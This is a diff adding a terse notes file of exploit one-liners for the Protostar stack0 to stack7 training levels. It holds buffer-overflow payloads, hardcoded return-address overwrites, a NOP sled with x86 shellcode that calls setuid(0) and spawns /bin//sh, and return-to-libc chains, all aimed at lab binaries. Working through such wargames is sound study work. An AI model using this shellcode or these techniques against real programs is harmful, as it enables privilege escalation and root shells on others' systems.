@@ -1,0 +1,34 @@
+# shell : bash
+
+stack0
+# simple buffer overflow
+(python -c 'print "A" * 64 + "B"';cat) | /opt/protostar/bin/stack0
+
+stack1
+# simple buffer overflow2
+/opt/protostar/bin/stack1 `python -c 'print "A" * 64 + "\x64\x63\x62\x61"'`
+
+stack2
+# env setting buffer overflow
+export GREENIE=`python -c 'print "A" * 64 + "\x0a\x0d\x0a\x0d"'`
+/opt/protostar/bin/stack2
+
+stack3
+# int fp -> win_function_add
+(python -c 'print "A" * 64 + "\x24\x84\x04\x08"') | /opt/protostar/bin/stack3
+
+stack4
+# ret_add -> win_function_add
+(python -c 'print "A" * 72 + "BBBB" + "\xf4\x83\x04\x08"') | /opt/protostar/bin/stack4
+
+stack5
+# ret_add -> buffer_add and buffer -> shellcode
+(python -c 'print "\x90" * 19 + "\x31\xc0\xb0\x31\xcd\x80\x89\xc1\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+ "A" * 12 + "BBBB" + "\x90\xf7\xff\xbf"'; cat) | /opt/protostar/bin/stack5
+
+stack6
+# simple RTL
+(python -c 'print "A" * 76 + "BBBB" + "\xb0\xcf\x05\x40" + "DDDD" + "\xbf\x33\x14\x40"';cat) | /opt/protostar/bin/stack6
+
+stack7
+# simple RTL
+(python -c 'print "A" * 76 + "BBBB" + "\xb0\xcf\x05\x40" + "DDDD" + "\xbf\x33\x14\x40"';cat) | /opt/protostar/bin/stack7
